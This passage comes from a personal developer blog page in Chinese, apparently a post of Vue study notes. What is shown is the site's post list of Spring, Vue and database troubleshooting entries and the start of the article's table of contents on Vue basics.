<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Vue筆記 | Myblog</title>
  <meta name="keywords" content=" Vue ">
  <meta name="description" content="Vue筆記 | Myblog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="踩坑紀錄問題： 當前後分離項目要進行權限管理時，通常使用JWT來並使用Filter進行權限驗證，當完成代碼後，發現前端傳送的自定義的requestHeaders：Authorization無法由後端的request.getHeader(“Authorization”)獲取，除錯發現是因為跨域問題造成 解決方案： 解決問題的關鍵在於，瀏覽器會在發送 Ajax 請求之前發送一個預請求，確認當前的接口是">
<meta property="og:type" content="article">
<meta property="og:title" content="前後分離項目，JWT使用filter完成的跨域問題">
<meta property="og:url" content="https://ekerchung.github.io/2023/05/09/26_%E5%89%8D%E5%BE%8C%E5%88%86%E9%9B%A2%E9%A0%85%E7%9B%AE%EF%BC%8CJWT%E4%BD%BF%E7%94%A8filter%E5%AE%8C%E6%88%90%E7%9A%84%E8%B7%A8%E5%9F%9F%E5%95%8F%E9%A1%8C/index.html">
<meta property="og:site_name" content="Myblog">
<meta property="og:description" content="踩坑紀錄問題： 當前後分離項目要進行權限管理時，通常使用JWT來並使用Filter進行權限驗證，當完成代碼後，發現前端傳送的自定義的requestHeaders：Authorization無法由後端的request.getHeader(“Authorization”)獲取，除錯發現是因為跨域問題造成 解決方案： 解決問題的關鍵在於，瀏覽器會在發送 Ajax 請求之前發送一個預請求，確認當前的接口是">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-05-08T17:10:58.686Z">
<meta property="article:modified_time" content="2023-05-08T17:26:16.584Z">
<meta property="article:author" content="Eker的編程筆記">
<meta property="article:tag" content="踩坑">
<meta property="article:tag" content="SpringBoot">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 5.4.2"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>Eker的編程筆記</span>
</div>

<div class="icon">
    
        
    
        
            <a title="github"
               href="https://github.com/Ekerchung"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
            <a title="linkedin"
               href="https://www.linkedin.com/in/yhc-b6a641155/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-linkedin"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            <a title="email"
               href="mailto:b8954008@gmail.com"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-email"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
</div>




<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(27)</small>
            
        </div>
    </li>
    
        
            
                <li>
                    <div data-rel="自學筆記">
                        <i class="fold iconfont icon-right"></i>
                        
                        自學筆記
                        <small>(6)</small>
                        
                    </div>
                    
                        <ul class="sub hide">
                            
                                <li>
                                    <div data-rel="自學筆記<--->前端">
                                        
                                        前端
                                        
                                            <small>(1
                                                )</small>
                                        
                                    </div>
                                    
                                </li>
                            
                                <li>
                                    <div data-rel="自學筆記<--->數據庫">
                                        
                                        數據庫
                                        
                                            <small>(1
                                                )</small>
                                        
                                    </div>
                                    
                                </li>
                            
                                <li>
                                    <div data-rel="自學筆記<--->Spring">
                                        
                                        Spring
                                        
                                            <small>(4
                                                )</small>
                                        
                                    </div>
                                    
                                </li>
                            
                        </ul>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="前端">
                        <i class="fold iconfont icon-right"></i>
                        
                        前端
                        <small>(8)</small>
                        
                    </div>
                    
                        <ul class="sub hide">
                            
                                <li>
                                    <div data-rel="前端<--->Spring">
                                        <i class="fold iconfont icon-right"></i>
                                        
                                        Spring
                                        
                                            <small>(2
                                                )</small>
                                        
                                    </div>
                                    
                                        <ul class="sub hide">
                                            
                                                <li>
                                                    <div data-rel="前端<--->Spring踩坑">
                                                        
                                                        踩坑
                                                        
                                                            <small>(2)</small>
                                                        
                                                    </div>
                                                </li>
                                            
                                        </ul>
                                    
                                </li>
                            
                                <li>
                                    <div data-rel="前端<--->Vue">
                                        <i class="fold iconfont icon-right"></i>
                                        
                                        Vue
                                        
                                            <small>(5
                                                )</small>
                                        
                                    </div>
                                    
                                        <ul class="sub hide">
                                            
                                                <li>
                                                    <div data-rel="前端<--->Vue踩坑">
                                                        
                                                        踩坑
                                                        
                                                            <small>(5)</small>
                                                        
                                                    </div>
                                                </li>
                                            
                                        </ul>
                                    
                                </li>
                            
                        </ul>
                    
                </li>
            
        
    
        
            
        
    
        
            
                <li>
                    <div data-rel="後端">
                        <i class="fold iconfont icon-right"></i>
                        
                        後端
                        <small>(11)</small>
                        
                    </div>
                    
                        <ul class="sub hide">
                            
                                <li>
                                    <div data-rel="後端<--->Spring">
                                        <i class="fold iconfont icon-right"></i>
                                        
                                        Spring
                                        
                                            <small>(5
                                                )</small>
                                        
                                    </div>
                                    
                                        <ul class="sub hide">
                                            
                                                <li>
                                                    <div data-rel="後端<--->Spring踩坑">
                                                        
                                                        踩坑
                                                        
                                                            <small>(4)</small>
                                                        
                                                    </div>
                                                </li>
                                            
                                        </ul>
                                    
                                </li>
                            
                                <li>
                                    <div data-rel="後端<--->SpringBoot">
                                        <i class="fold iconfont icon-right"></i>
                                        
                                        SpringBoot
                                        
                                            <small>(6
                                                )</small>
                                        
                                    </div>
                                    
                                        <ul class="sub hide">
                                            
                                                <li>
                                                    <div data-rel="後端<--->SpringBoot踩坑">
                                                        
                                                        踩坑
                                                        
                                                            <small>(6)</small>
                                                        
                                                    </div>
                                                </li>
                                            
                                        </ul>
                                    
                                </li>
                            
                        </ul>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="數據庫">
                        <i class="fold iconfont icon-right"></i>
                        
                        數據庫
                        <small>(1)</small>
                        
                    </div>
                    
                        <ul class="sub hide">
                            
                                <li>
                                    <div data-rel="數據庫<--->踩坑">
                                        
                                        踩坑
                                        
                                            <small>(1
                                                )</small>
                                        
                                    </div>
                                    
                                </li>
                            
                        </ul>
                    
                </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
            <a class="about  site_url"
               
               href="https://ekerchung.github.io/">About</a>
        
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="27">
<input type="hidden" id="yelog_site_word_count" value="141.9k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>踩坑</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>axios</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>hibernate</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>mybatis</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Mybatis</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>MySql</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Redis</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>spring</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Spring</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>SpringBoot</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>springMVC</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Thymeleaf</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Vue</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        
        <a  class="All 後端 SpringBoot 踩坑 "
           href="/2023/05/09/26_%E5%89%8D%E5%BE%8C%E5%88%86%E9%9B%A2%E9%A0%85%E7%9B%AE%EF%BC%8CJWT%E4%BD%BF%E7%94%A8filter%E5%AE%8C%E6%88%90%E7%9A%84%E8%B7%A8%E5%9F%9F%E5%95%8F%E9%A1%8C/"
           data-tag="踩坑,SpringBoot"
           data-author="" >
            <span class="post-title" title="前後分離項目，JWT使用filter完成的跨域問題">前後分離項目，JWT使用filter完成的跨域問題</span>
            <span class="post-date" title="2023-05-09 01:10:58">2023/05/09</span>
        </a>
        
        
        <a  class="All 前端 Vue 踩坑 "
           href="/2023/04/29/25_Vue%E4%BD%BF%E7%94%A8Element%20UI%E6%99%82%EF%BC%8C%E6%B8%85%E7%A9%BAform%E8%A1%A8%E5%96%AE%E6%95%B8%E6%93%9A%E5%8F%8A%E6%9B%B4%E6%96%B0%E8%A1%A8%E6%A0%BC%E8%B3%87%E6%96%99%E5%95%8F%E9%A1%8C/"
           data-tag="踩坑,Vue"
           data-author="" >
            <span class="post-title" title="Vue使用Element UI時，清空form表單數據及更新表格資料問題">Vue使用Element UI時，清空form表單數據及更新表格資料問題</span>
            <span class="post-date" title="2023-04-29 01:00:54">2023/04/29</span>
        </a>
        
        
        <a  class="All 前端 Vue 踩坑 "
           href="/2023/04/29/24_Vue%E4%BD%BF%E7%94%A8Element%20UI%E6%99%82%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%B7%B1%E6%8B%B7%E8%B2%9D%E9%81%BF%E5%85%8D%E4%BF%AE%E6%94%B9%E5%BD%88%E7%AA%97%E8%B3%87%E6%96%99%E8%88%87%E8%A1%A8%E6%A0%BC%E8%B3%87%E6%96%99%E9%80%A3%E5%8B%95/"
           data-tag="踩坑,Vue"
           data-author="" >
            <span class="post-title" title="Vue使用Element UI時，使用深拷貝避免修改彈窗資料與表格資料連動">Vue使用Element UI時，使用深拷貝避免修改彈窗資料與表格資料連動</span>
            <span class="post-date" title="2023-04-29 00:28:44">2023/04/29</span>
        </a>
        
        
        <a  class="All 後端 SpringBoot 踩坑 "
           href="/2023/04/28/23_SpringBoot%20Data%20Jpa%E4%B8%AD%E6%96%B0%E5%A2%9E%E6%95%B8%E6%93%9A%E5%88%B0MySql%E5%A0%B1%E9%8C%AF/"
           data-tag="踩坑,hibernate"
           data-author="" >
            <span class="post-title" title="SpringBoot Data Jpa中新增數據到MySql報錯">SpringBoot Data Jpa中新增數據到MySql報錯</span>
            <span class="post-date" title="2023-04-28 12:05:16">2023/04/28</span>
        </a>
        
        
        <a  class="All 前端 Vue 踩坑 "
           href="/2023/04/27/22_%E4%BD%BF%E7%94%A8Vuex%E4%BF%9D%E5%AD%98%E6%95%B8%E6%93%9A%E5%BE%8C%EF%BC%8C%E5%88%B7%E6%96%B0%E9%A0%81%E9%9D%A2%E5%9C%96%E8%A1%A8%E6%B8%B2%E6%9F%93%E6%B2%92%E8%B3%87%E6%96%99/"
           data-tag="踩坑,Vue"
           data-author="" >
            <span class="post-title" title="使用Vuex保存數據後，刷新頁面圖表渲染沒資料">使用Vuex保存數據後，刷新頁面圖表渲染沒資料</span>
            <span class="post-date" title="2023-04-27 15:01:48">2023/04/27</span>
        </a>
        
        
        <a  class="All 後端 SpringBoot 踩坑 "
           href="/2023/04/25/21_SpringBoot%20Data%20Jpa%E4%B8%AD@OneToMany%E7%9A%84Lazy%E5%8A%A0%E8%BC%89%E5%95%8F%E9%A1%8C/"
           data-tag="踩坑,hibernate"
           data-author="" >
            <span class="post-title" title="SpringBoot Data Jpa中@OneToMany的Lazy加載問題">SpringBoot Data Jpa中@OneToMany的Lazy加載問題</span>
            <span class="post-date" title="2023-04-25 01:24:36">2023/04/25</span>
        </a>
        
        
        <a  class="All 後端 SpringBoot 踩坑 "
           href="/2023/04/24/20_SpringBoot%20+%20Vue%E5%89%8D%E5%BE%8C%E5%88%86%E9%9B%A2%E9%A0%85%E7%9B%AE%E5%9B%9E%E5%82%B3%E6%97%A5%E6%9C%9F%E5%B7%AE%E4%B8%80%E5%A4%A9(8hr)/"
           data-tag="踩坑,Vue,hibernate"
           data-author="" >
            <span class="post-title" title="SpringBoot + Vue前後分離項目回傳日期差一天(8hr)">SpringBoot + Vue前後分離項目回傳日期差一天(8hr)</span>
            <span class="post-date" title="2023-04-24 17:29:28">2023/04/24</span>
        </a>
        
        
        <a  class="All 後端 SpringBoot 踩坑 "
           href="/2023/04/21/19_SpringBoot%20Data%20Jpa%20%E7%B4%9A%E8%81%AF%E6%9F%A5%E8%A9%A2%E6%AD%BB%E5%BE%AA%E7%92%B0/"
           data-tag="踩坑,hibernate"
           data-author="" >
            <span class="post-title" title="SpringBoot Data Jpa 級聯查詢死循環">SpringBoot Data Jpa 級聯查詢死循環</span>
            <span class="post-date" title="2023-04-21 17:15:51">2023/04/21</span>
        </a>
        
        
        <a  class="All 後端 SpringBoot 踩坑 "
           href="/2023/04/21/18_hibernate%E8%BF%94%E5%9B%9E%E7%9A%84%E5%AF%A6%E9%AB%94%E9%A1%9E%E5%B0%8D%E8%B1%A1%E7%84%A1%E6%B3%95%E8%BD%89JSON%E9%9F%BF%E6%87%89%E7%B5%A6%E5%89%8D%E7%AB%AF/"
           data-tag="踩坑,hibernate"
           data-author="" >
            <span class="post-title" title="hibernate返回的實體類對象無法轉JSON響應給前端">hibernate返回的實體類對象無法轉JSON響應給前端</span>
            <span class="post-date" title="2023-04-21 01:44:46">2023/04/21</span>
        </a>
        
        
        <a  class="All 前端 Vue 踩坑 "
           href="/2023/04/19/16_Vue%20Router%E8%8F%9C%E5%96%AE%E9%87%8D%E8%A4%87%E9%BB%9E%E6%93%8A-%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%A0%B1%E9%8C%AF/"
           data-tag="踩坑,Vue"
           data-author="" >
            <span class="post-title" title="Vue Router菜單重複點擊-控制台報錯">Vue Router菜單重複點擊-控制台報錯</span>
            <span class="post-date" title="2023-04-19 11:40:28">2023/04/19</span>
        </a>
        
        
        <a  class="All 前端 Vue 踩坑 "
           href="/2023/04/18/17_%E5%9F%B7%E8%A1%8CVue%E9%A0%85%E7%9B%AE%E5%A0%B1%E9%8C%AFerror_0308010C/"
           data-tag="踩坑,Vue"
           data-author="" >
            <span class="post-title" title="執行Vue項目報錯error_0308010C">執行Vue項目報錯error_0308010C</span>
            <span class="post-date" title="2023-04-18 00:37:45">2023/04/18</span>
        </a>
        
        
        <a  class="All 自學筆記 前端 "
           href="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/"
           data-tag="Vue"
           data-author="" >
            <span class="post-title" title="Vue筆記">Vue筆記</span>
            <span class="post-date" title="2023-04-17 10:05:06">2023/04/17</span>
        </a>
        
        
        <a  class="All 自學筆記 數據庫 "
           href="/2023/04/10/14_Redis%E7%AD%86%E8%A8%98/"
           data-tag="Redis"
           data-author="" >
            <span class="post-title" title="Redis筆記">Redis筆記</span>
            <span class="post-date" title="2023-04-10 11:00:16">2023/04/10</span>
        </a>
        
        
        <a  class="All 自學筆記 Spring "
           href="/2023/03/28/13_SpringBoot%E7%AD%86%E8%A8%98/"
           data-tag="SpringBoot"
           data-author="" >
            <span class="post-title" title="SpringBoot筆記">SpringBoot筆記</span>
            <span class="post-date" title="2023-03-28 11:00:16">2023/03/28</span>
        </a>
        
        
        <a  class="All 後端 Spring 踩坑 "
           href="/2023/03/12/12_Mybatis-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E7%94%A2%E7%94%9FMapper.xml%E6%9C%89%E8%AA%A4/"
           data-tag="Spring,踩坑,Mybatis"
           data-author="" >
            <span class="post-title" title="Mybatis-逆向工程產生Mapper.xml有誤">Mybatis-逆向工程產生Mapper.xml有誤</span>
            <span class="post-date" title="2023-03-12 00:55:45">2023/03/12</span>
        </a>
        
        
        <a  class="All 後端 Spring 踩坑 "
           href="/2023/03/10/11_Thymeleaf%E6%B8%B2%E6%9F%93%E6%95%B8%E6%93%9A%E5%BA%AB%E5%85%A7%E4%BF%9D%E5%AD%98%E7%9A%84%E6%99%82%E9%96%93/"
           data-tag="Spring,踩坑,Thymeleaf"
           data-author="" >
            <span class="post-title" title="Thymeleaf-渲染數據庫內保存的時間">Thymeleaf-渲染數據庫內保存的時間</span>
            <span class="post-date" title="2023-03-10 22:42:14">2023/03/10</span>
        </a>
        
        
        <a  class="All 數據庫 踩坑 "
           href="/2023/03/10/10_MySql%E4%BF%9D%E5%AD%98%E6%99%82%E9%96%93%E6%99%82%E5%8D%80%E5%95%8F%E9%A1%8C/"
           data-tag="踩坑,MySql"
           data-author="" >
            <span class="post-title" title="MySql-保存時間時區問題">MySql-保存時間時區問題</span>
            <span class="post-date" title="2023-03-10 22:20:25">2023/03/10</span>
        </a>
        
        
        <a  class="All 前端 "
           href="/2023/03/07/09_Vue%E4%BD%BF%E7%94%A8%E5%8E%9F%E7%94%9F%E7%9A%84confirm%20dialog/"
           data-tag="Vue"
           data-author="" >
            <span class="post-title" title="Vue使用原生的confirm dialog">Vue使用原生的confirm dialog</span>
            <span class="post-date" title="2023-03-07 15:37:59">2023/03/07</span>
        </a>
        
        
        <a  class="All 前端 Spring 踩坑 "
           href="/2023/03/07/08_Vue%E5%AF%A6%E7%8F%BE%E4%BD%BF%E7%94%A8%E8%B6%85%E9%80%A3%E7%B5%90%E7%99%BC%E9%80%81delete%E8%AB%8B%E6%B1%82/"
           data-tag="Spring,踩坑,Vue"
           data-author="" >
            <span class="post-title" title="Vue實現使用超連結發送delete請求">Vue實現使用超連結發送delete請求</span>
            <span class="post-date" title="2023-03-07 14:39:23">2023/03/07</span>
        </a>
        
        
        <a  class="All 前端 Spring 踩坑 "
           href="/2023/03/05/07_Vue+axios%E5%AF%A6%E7%8F%BE%E7%95%B0%E6%AD%A5%E8%AB%8B%E6%B1%82%E9%A9%97%E8%AD%89%E8%A8%BB%E5%86%8A%E8%A1%A8%E5%96%AE/"
           data-tag="Spring,踩坑,Vue,axios"
           data-author="" >
            <span class="post-title" title="Vue+axios實現異步請求驗證註冊表單">Vue+axios實現異步請求驗證註冊表單</span>
            <span class="post-date" title="2023-03-05 23:05:46">2023/03/05</span>
        </a>
        
        
        <a  class="All 後端 Spring 踩坑 "
           href="/2023/02/26/06_Spring-MySQL%E9%85%8D%E7%BD%AE%E5%A0%B1%E9%8C%AF/"
           data-tag="Spring,踩坑"
           data-author="" >
            <span class="post-title" title="Spring-MySQL配置報錯">Spring-MySQL配置報錯</span>
            <span class="post-date" title="2023-02-26 23:49:18">2023/02/26</span>
        </a>
        
        
        <a  class="All 後端 Spring 踩坑 "
           href="/2023/02/25/05_Mybatis-%E6%8F%92%E4%BB%B6mybatis-generator%E4%B8%8D%E9%A1%AF%E7%A4%BA/"
           data-tag="mybatis,Spring,踩坑"
           data-author="" >
            <span class="post-title" title="Mybatis-插件mybatis-generator不顯示">Mybatis-插件mybatis-generator不顯示</span>
            <span class="post-date" title="2023-02-25 00:28:36">2023/02/25</span>
        </a>
        
        
        <a  class="All 後端 Spring "
           href="/2023/02/23/04_SSM-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%95%B4%E5%90%88/"
           data-tag="springMVC,mybatis,spring"
           data-author="" >
            <span class="post-title" title="SSM-配置文件整合">SSM-配置文件整合</span>
            <span class="post-date" title="2023-02-23 16:39:00">2023/02/23</span>
        </a>
        
        
        <a  class="All 自學筆記 Spring "
           href="/2023/02/23/03_Spring%E7%AD%86%E8%A8%98/"
           data-tag="spring"
           data-author="" >
            <span class="post-title" title="Spring筆記">Spring筆記</span>
            <span class="post-date" title="2023-02-23 16:39:00">2023/02/23</span>
        </a>
        
        
        <a  class="All 自學筆記 Spring "
           href="/2023/02/23/02_SpringMVC%E7%AD%86%E8%A8%98/"
           data-tag="springMVC"
           data-author="" >
            <span class="post-title" title="SpringMVC筆記">SpringMVC筆記</span>
            <span class="post-date" title="2023-02-23 16:39:00">2023/02/23</span>
        </a>
        
        
        <a  class="All 自學筆記 Spring "
           href="/2023/02/23/01_Mybatis%E7%AD%86%E8%A8%98/"
           data-tag="mybatis"
           data-author="" >
            <span class="post-title" title="Mybatis筆記">Mybatis筆記</span>
            <span class="post-date" title="2023-02-23 16:39:00">2023/02/23</span>
        </a>
        
        
        <a  class="All "
           href="/2023/02/23/hello-world/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Hello World">Hello World</span>
            <span class="post-date" title="2023-02-23 16:37:11">2023/02/23</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-15_Vue筆記" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">Vue筆記</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="自學筆記">自學筆記</a> > 
            
            <a  data-rel="自學筆記&lt;---&gt;前端">前端</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color4">Vue</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2023-04-17 10:38:25'>2023-04-17 10:05</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:41.5k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-vue%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-text">1. vue基础知识和原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E5%88%9D%E8%AF%86Vue"><span class="toc-text">1.1 初识Vue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="toc-text">1.2 模板语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A"><span class="toc-text">1.3 数据绑定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-el%E4%B8%8Edata%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">1.4 el与data的两种写法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-Vue%E4%B8%AD%E7%9A%84MVVM"><span class="toc-text">1.5 Vue中的MVVM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86"><span class="toc-text">1.6 数据代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bulb-%E5%B0%8F%E7%B5%90%EF%BC%9A"><span class="toc-text">:bulb:小結：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-7-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86"><span class="toc-text">1.7 事件处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-8-%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6"><span class="toc-text">1.8 键盘事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-9-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7"><span class="toc-text">1.9 计算属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-10-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7"><span class="toc-text">1.10 监视属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-1-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7watch%EF%BC%9A"><span class="toc-text">1.10.1 监视属性watch：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-2-%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86%EF%BC%9A"><span class="toc-text">1.10.2 深度监视：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-3-computed%E5%92%8Cwatch%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-text">1.10.3 computed和watch之间的区别：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-11-%E7%BB%91%E5%AE%9A%E6%A0%B7%E5%BC%8F"><span class="toc-text">1.11 绑定样式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-1-class%E6%A0%B7%E5%BC%8F"><span class="toc-text">1.11.1 class样式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E6%B3%95"><span class="toc-text">1. 字符串写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95"><span class="toc-text">2. 数组写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-text">3. 对象写法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-2-style%E6%A0%B7%E5%BC%8F"><span class="toc-text">1.11.2 style样式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-text">1. 对象写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95-1"><span class="toc-text">2. 数组写法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-12-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93"><span class="toc-text">1.12 条件渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-1-v-if"><span class="toc-text">1.12.1 v-if</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-2-v-show"><span class="toc-text">1.12.2 v-show</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-13-%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93"><span class="toc-text">1.13 列表渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-1-%E5%9F%BA%E6%9C%AC%E5%88%97%E8%A1%A8-v-for%E6%8C%87%E4%BB%A4"><span class="toc-text">1.13.1 基本列表 (v-for指令)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-2-key%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">1.13.2 key的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%9C%9F%E5%AE%9EDOM%E5%92%8C%E5%85%B6%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-text">1. 真实DOM和其解析流程</span></a></li><li class="toc-item 